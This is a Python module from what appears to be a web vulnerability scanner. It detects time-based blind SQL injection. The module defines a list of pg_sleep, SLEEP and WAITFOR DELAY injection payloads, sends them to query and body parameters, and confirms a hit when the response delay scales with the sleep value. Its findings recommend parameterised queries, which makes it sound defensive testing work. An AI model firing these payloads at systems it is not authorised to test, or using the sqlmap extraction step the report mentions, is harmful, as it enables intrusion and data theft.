"""A03 — Blind SQL injection (time-based).

The existing SQLi sweep (a03) only fires when the app *leaks a database error*.
Most production apps don't — they swallow errors and return a generic 200/500,
so the injection is **blind** and invisible to error-based detection. The
reliable oracle for blind SQLi is the same as for blind command injection:
**time**. Inject a database-specific sleep (`pg_sleep`, `SLEEP`, `WAITFOR
DELAY`) and see whether the response is delayed by the number of seconds
injected — and, to eliminate a coincidentally-slow endpoint, confirm the delay
*scales* with the value (sleep 2 ≈ 2s, sleep 5 ≈ 5s).

Covers query parameters (GET) and string body fields (POST/PUT/PATCH), in both
string (`' AND pg_sleep(5)--`) and numeric (`AND pg_sleep(5)`) contexts, across
Postgres / MySQL / MSSQL. A confirmed scaling delay is CRITICAL — it's arbitrary
SQL execution against the database. Body probes write nothing themselves but run
attacker SQL, so they're FULL-mode only.
"""

from __future__ import annotations

import requests

from ..core.context import Context
from ..core.reqbuild import build_request, string_body_fields
from ..core.taxonomy import REFS
from ..discovery.openapi import body_field_names
from .base import module

_BENIGN = "heimdall"
_LONG = 5
_SHORT = 2


def _payloads(n: int) -> list[str]:
    """Sleep payloads across dialects × (string-close, numeric) contexts."""
    return [
        # string context — break out of a quoted value
        f"' AND (SELECT 1 FROM pg_sleep({n}))--",
        f"' OR (SELECT 1 FROM pg_sleep({n}))--",
        f"'||(SELECT pg_sleep({n}))||'",
        f"'; SELECT pg_sleep({n})--",
        f"' AND SLEEP({n})-- -",
        f"' OR SLEEP({n})-- -",
        f"'||(SELECT SLEEP({n}))||'",
        f"'; WAITFOR DELAY '0:0:{n}'--",
        # numeric context — value used unquoted
        f" AND (SELECT 1 FROM pg_sleep({n}))",
        f";SELECT pg_sleep({n})",
        f" AND SLEEP({n})",
        f"(SELECT pg_sleep({n}))",
        f";WAITFOR DELAY '0:0:{n}'",
    ]


_MAX_CANDIDATES = 20
_TIMEOUT = _LONG + 6
_HIT_FLOOR = _LONG - 0.7
_BASELINE_CEIL = 2.0
_SHORT_BAND = (_SHORT - 0.9, _SHORT + 1.8)


@module("sqli-blind", "Blind SQL Injection (time-based)", destructive=True)
def run(ctx: Context) -> None:
    token = _actor_token(ctx)
    candidates = _discover(ctx)
    if not candidates:
        ctx.note("sqli-blind: no query/body parameters to probe")
        return

    confirmed: list[dict] = []
    probed = 0
    for route, name, location in candidates[:_MAX_CANDIDATES]:
        if location == "body" and ctx.safe:
            continue
        probed += 1
        hit = _probe(ctx, route, name, location, token)
        if hit:
            confirmed.append(hit)

    ctx.note(f"sqli-blind: probed {probed} parameter(s), {len(confirmed)} "
             "confirmed via scaling time delay")
    if confirmed:
        _report(ctx, confirmed)
    elif probed:
        _report_safe(ctx, probed)


def _actor_token(ctx: Context) -> str | None:
    princ = ctx.principal("attacker", "user") or ctx.principal("admin")
    return princ.token if princ and princ.authed else None


def _discover(ctx: Context) -> list[tuple]:
    out, seen = [], set()
    for r in ctx.routes:
        for p in r.query_params:
            name = p.get("name") if isinstance(p, dict) else None
            if name and (r.key, name, "query") not in seen:
                seen.add((r.key, name, "query"))
                out.append((r, name, "query"))
        if r.method in ("POST", "PUT", "PATCH"):
            for name in (string_body_fields(r) or body_field_names(r)):
                if (r.key, name, "body") not in seen:
                    seen.add((r.key, name, "body"))
                    out.append((r, name, "body"))
    return out


def _elapsed(resp) -> float:
    try:
        return resp.elapsed.total_seconds()
    except Exception:  # pragma: no cover
        return 0.0


def _send(ctx, route, name, location, value, token):
    try:
        if location == "query":
            path = route.fill_path({p: "1" for p in route.path_params})
            resp = ctx.get(path, params={name: value}, token=token,
                           timeout=_TIMEOUT, retry_429=False)
        else:
            path, body = build_request(ctx, route, token, overrides={name: value})
            resp = ctx.request(route.method, path, token=token, json=body,
                               timeout=_TIMEOUT, retry_429=False)
        return _elapsed(resp), True
    except requests.Timeout:
        return float(_TIMEOUT), True
    except requests.RequestException:
        return 0.0, False


def _probe(ctx, route, name, location, token) -> dict | None:
    b1, ok1 = _send(ctx, route, name, location, _BENIGN, token)
    b2, ok2 = _send(ctx, route, name, location, _BENIGN, token)
    if not (ok1 or ok2):
        return None
    baseline = min(b1, b2)
    if baseline >= _BASELINE_CEIL:
        return None
    for payload in _payloads(_LONG):
        elapsed, ok = _send(ctx, route, name, location, payload, token)
        if not ok or elapsed < _HIT_FLOOR:
            continue
        if elapsed - baseline < _HIT_FLOOR - _BASELINE_CEIL:
            continue
        # confirm the delay scales with the injected sleep value
        short_payload = payload.replace(f"pg_sleep({_LONG})", f"pg_sleep({_SHORT})") \
            .replace(f"SLEEP({_LONG})", f"SLEEP({_SHORT})") \
            .replace(f"0:0:{_LONG}", f"0:0:{_SHORT}")
        short_el, sok = _send(ctx, route, name, location, short_payload, token)
        long_el, lok = _send(ctx, route, name, location, payload, token)
        if (sok and lok and _SHORT_BAND[0] <= short_el <= _SHORT_BAND[1]
                and long_el >= _HIT_FLOOR and long_el - short_el >= 1.5):
            return {"route": route, "name": name, "location": location,
                    "payload": payload, "baseline": baseline,
                    "short": short_el, "long": long_el}
    return None


def _report(ctx: Context, confirmed: list[dict]) -> None:
    lead = confirmed[0]
    r = lead["route"]
    lines = []
    for c in confirmed[:15]:
        cr = c["route"]
        lines.append(
            f"  {cr.method} {cr.path} [{c['location']}:{c['name']}] "
            f"payload={c['payload']!r}\n"
            f"      baseline={c['baseline']:.2f}s  sleep2={c['short']:.2f}s  "
            f"sleep5={c['long']:.2f}s  (delay tracks the injected sleep)")
    ctx.finding(
        id="a03-sqli-time-based",
        owasp="A03", severity="CRITICAL",
        title=(f"Blind SQL injection via {lead['name']} on {r.method} {r.path}"
               + (f" (+{len(confirmed) - 1} more)" if len(confirmed) > 1 else "")),
        summary=(
            "A parameter is concatenated into a SQL query. Injecting a "
            "database sleep (pg_sleep / SLEEP / WAITFOR DELAY) delayed the "
            "response by exactly the number of seconds injected — confirmed by "
            "re-running with a different sleep and watching the response time "
            "track it. This is arbitrary SQL execution even though no error or "
            "data is reflected (blind): an attacker can read any table "
            "(credentials, tokens, PII) a character at a time, and depending on "
            "DB privileges write data or reach the OS. Use parameterised queries "
            "/ an ORM binding for every user-supplied value; never string-format "
            "SQL."
        ),
        evidence="\n".join(lines),
        route=f"{r.method} {r.path}",
        request=(f"{r.method} {r.path}  ({lead['location']} '{lead['name']}' = "
                 f"{lead['payload']!r})"),
        reproduction=(
            f"Send {r.method} {r.path} with {lead['location']} '{lead['name']}' = "
            f"\"{_BENIGN}' AND (SELECT 1 FROM pg_sleep(5))--\"; response takes ~5s. "
            f"Repeat with pg_sleep(2) (~2s) to confirm. Then automate extraction "
            f"with sqlmap using the same injection point."
        ),
        references=[REFS["A03"], REFS["ps-sqli"],
                    "https://portswigger.net/web-security/sql-injection/blind"],
        tools=["sqlmap", "Burp Suite (Intruder)"],
    )


def _report_safe(ctx: Context, probed: int) -> None:
    ctx.finding(
        id="a03-sqli-blind-safe",
        owasp="A03", severity="SAFE",
        title="No time-based blind SQL injection observed",
        summary=(
            f"Injected dialect-specific sleep payloads (pg_sleep/SLEEP/WAITFOR, "
            f"string and numeric contexts) into {probed} parameter(s); none "
            "produced a scaling response delay, consistent with parameterised "
            "queries / ORM binding. This complements the error-based sweep — "
            "together they cover both visible and blind SQLi — but a stacked-query "
            "or second-order sink with no timing channel can't be fully excluded."
        ),
        references=[REFS["A03"], REFS["ps-sqli"]],
    )
